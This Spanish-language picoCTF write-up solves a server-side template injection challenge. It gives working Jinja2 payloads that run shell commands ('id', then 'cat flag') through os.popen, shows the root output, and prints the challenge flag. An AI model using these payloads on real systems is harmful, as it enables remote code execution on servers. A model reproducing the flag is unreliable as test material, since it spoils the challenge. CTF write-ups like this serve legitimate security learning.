### Descripción
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:57741/)!

Hints:
1. Server Side Template Injection

### Solución
Entramos a la página y en https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/ encontramos un script que nos ayudará a obtener la flag:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Al introducirlo nos muestra:
```
# uid=0(root) gid=0(root) groups=0(root)
```

Configuramos el script para mandar cat flag en lugar de id:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

Y ahora si nos muestra la flag:
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}

### Notas adicionales

### Referencias
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/